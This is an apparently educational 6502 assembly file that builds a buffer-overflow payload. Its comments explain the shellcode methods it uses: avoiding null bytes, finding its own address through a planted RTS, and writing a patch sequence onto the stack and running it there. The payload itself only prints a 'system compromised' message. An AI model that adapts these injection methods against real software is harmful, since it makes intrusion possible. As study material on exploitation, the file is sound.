#include "cpu6502.asm"

; Overflow the buffer
; For the sake of simplicity, we will assume the attacker somehow knows that the
; buffer is exactly 20 bytes long.
#d "You are being hacked"

RTS_OPCODE = 0x60
JMP_ABS_OPCODE = 0x4C
STA_ABS_XIDX_OPCODE = 0x9D
LDA_ZPG_OPCODE = 0xA5
LDX_IMM_OPCODE = 0xA2
LDY_ABS_XIDX_OPCODE = 0xBC

KNOWN_ADDR = 0xF8  ; pointer to location of payload in RAM
MSG_ADDR = 0xFA  ; pointer to location of message string in RAM
PATCH_EXIT = 0xFC  ; pointer to entry point of patch sequence

; Can't go on Zero Page with others because of the 0x00 in high byte
RTS_LOCATION = 0xFF60  ; location to write RTS opcode for PC determination
PATCH_ENTER = 0xFF61  ; pointer to exit destination of patch sequence

; This block of code displays a message to the Zero Page to signify that the payload
; has been successfully injected into a target system. The bulk of the work in this
; block is related to dealing with the absolute memory address of the message string
; we are outputting to the Zero Page. We must patch in that address at runtime, since
; the payload could be injected anywhere in RAM.
malicious_code:
    ; The code must determine where in RAM its been installed, so that it can
    ; calculate the proper address to refer to the message string by.
    ; Then, it must patch that address into the payload (self modifying code)

    ; specifically that is in one location, at the sty abs x indexed instruction
    ; which loads the string char by char in order to store them to the Zero Page.

    ; In order to determine its location, we will jump into a subroutine, as this
    ; pushes the PC to the stack. The subroutine can be effectively empty, only
    ; containing an RTS. After the routine returns, the bytes immediately above the
    ; SP will be that of the PC.

    ; The payload cannot contain the RTS directly, as JSR has only an absolute
    ; addressing mode, and that address will not be known at assembly time for the
    ; reasons described above.

    ; So, the payload must install an RTS on the target system. RTS opcode is
    ; $60 and we will install it at $FF60 as an homage to the Apple II sysyem which
    ; also kept an RTS in this position so that other code could relocate itself.

    ; Install the subroutine
    ldx #RTS_OPCODE
    stx RTS_LOCATION

    ; Jump to routine and then examine stack to determine location
    jsr RTS_LOCATION

    ; At this point, 0x0100 + S contains PC hi and 0x0101 + S contains PC lo
    known_location:
        tsx     ; x = sp

    ; Here, we must index from 0x0101, as opposed to 0x0100, because if we used that,
    ; then the low byte of that address (0x00) would be detected as a Null Terminator
    ; by the target system, and prematurely end payload injection.
    dex
    ldy 0x0101, x       ; y = [0x0101 + S]  (y = PC hi)
    sty KNOWN_ADDR + 1

    dex
    ldy 0x0101, x       ; a = [0x0101 + S - 1]  (a = PC lo)
    sty KNOWN_ADDR

    ; The Zero Page pointer KNOWN_ADDR now contains the absolute address of the byte
    ; immediately preceding the tsx, in Little Endian format.

    ; Now, we calculate the absolute address of the message string by adding its offset
    ; from the known location to the known location, and store this address in the
    ; Zero Page pointer MSG_ADDR.
    lda KNOWN_ADDR
    clc
    adc #MESSAGE_OFFSET     ; A = A + #MESSAGE_OFFSET
    sta MSG_ADDR

    lda KNOWN_ADDR + 1
    adc #1                  ; A = A + 1 + Carry
    tay                     ; Y = A
    dey                     ; remove the 1 (needed that bc can't have 0 byte in payload)
    sty MSG_ADDR + 1

    ; Now, *MSG_ADDR must be patched into the reference.
    ; A new code sequence must be written into memory and then executed in order to
    ; perform the patch. This is because the sequence to perform the patch includes
    ; absolute addresses that were not known at assembly time (specifically *MSG_ADDR
    ; which was just calculated), and there are no 6502 instructions to construct absolute
    ; references at runtime (other than the indirect JMP, which does not help here)

    ; We *could* select an arbitrary location in the target system's RAM to write our
    ; sequence to, but since that location would have to be selected by assembly time,
    ; there's no guarantee that the payload will not be injected at a location that
    ; overlaps with the selected address.

    ; The two "safe places" for us to write the sequence to are the Zero Page and the
    ; stack. I've decided to write the sequence to the stack. So we will write the sequence
    ; to the stack, jump into the stack to perform the patch, and then jump of the stack.

    ; Before constructing the sequence on the stack, the address that we need to jump off
    ; of the stack to needs to be determined. Specifically, this is to the beginning of
    ; the real work section of the payload.

    ; Compute and store lower half of address
    lda KNOWN_ADDR
    clc
    adc #LABEL_OFFSET   ; A = A + #LABEL_OFFSET
    sta PATCH_EXIT

    ; Compute and store upper half of address
    lda KNOWN_ADDR + 1
    adc #1              ; A = A + 1 + C
    tay                 ; Y = A
    dey                 ; Y -= 1 ---> Y = A + 1
    sty PATCH_EXIT + 1

    ; Finally, the patching sequence can be constructed. The sequence is as follows:

    ;       ldx #PATCH_LO_OFFSET
    ;       lda MSG_LO_ADDR
    ;       sta <known_location>, x
    ;          
    ;       ldx #PATCH_HI_OFFSET
    ;       lda MSG_HI_ADDR
    ;       sta <known_location>, x
    ;       
    ;       jmp PATCH_EXIT

    ; Because the stack grows downwards, the sequence needs to be constructed backwards
    ; This probably makes our lives harder because we need to pay very close attention
    ; to our endianness and such.

    ; 3 bytes: jmp PATCH_EXIT
    lda PATCH_EXIT + 1
    pha
    lda PATCH_EXIT
    pha
    lda #JMP_ABS_OPCODE
    pha

    ; 3 bytes: sta <known_location>, x
    lda KNOWN_ADDR + 1
    pha
    lda KNOWN_ADDR
    pha
    lda #STA_ABS_XIDX_OPCODE
    pha

    ; 2 bytes: lda MSG_HI_ADDR
    lda #(MSG_ADDR + 1)
    pha
    lda #LDA_ZPG_OPCODE
    pha

    ; 2 bytes: ldx #PATCH_HI_OFFSET
    lda #(PATCH_OFFSET + 1)
    pha
    lda #LDX_IMM_OPCODE
    pha

    ; 3 bytes: sta <known_location>, x
    lda KNOWN_ADDR + 1
    pha
    lda KNOWN_ADDR
    pha
    lda #STA_ABS_XIDX_OPCODE
    pha

    ; 2 bytes: lda MSG_HI_ADDR
    lda #MSG_ADDR
    pha
    lda #LDA_ZPG_OPCODE
    pha

    ; 2 bytes: ldx #PATCH_LO_OFFSET
    lda #PATCH_OFFSET
    pha
    lda #LDX_IMM_OPCODE
    pha

    ; Now the patch sequence is on the stack, so we need to jump onto the stack.
    ; Currently the SP points to the addr right below the entry point of the sequence.
    ; Move SP to X, increment it by 1 to point to the beginning of the sequence.
    ; Next, install this address to a fixed jump vector that we can jump on.

    tsx                     ; grab the stack pointer
    inx                     ; increment by 1
    stx PATCH_ENTER         ; save low byte

    ldx #0x01               ; SP high byte is a fixed 0x01
    stx PATCH_ENTER + 1     ; save high byte

    ; Finally, the address patch occurs
    jmp (PATCH_ENTER)       ; use jump vector

    write_message:
        ; get a 0 into x
        lda #1      ; a = 1
        sec         ; set carry so that we don't borrow on sub
        sbc #1      ; a -= 1 (a = 0)
        tax         ; x = a  (x = 0)

        loop:
            cpx #message_len
            beq done

            patch_location: ldy 0xADDE, x  ; $ADDE to be patched at runtime to point to message

            sty 1, x

            inx
            clc
            bcc loop

    done:   hlt

message:
    #d "The system has been compromised."
message_len = $ - message

LABEL_OFFSET = write_message - known_location + 1
MESSAGE_OFFSET = message - known_location + 1
PATCH_OFFSET = patch_location - known_location + 2

#d "\0"  ; end of payload
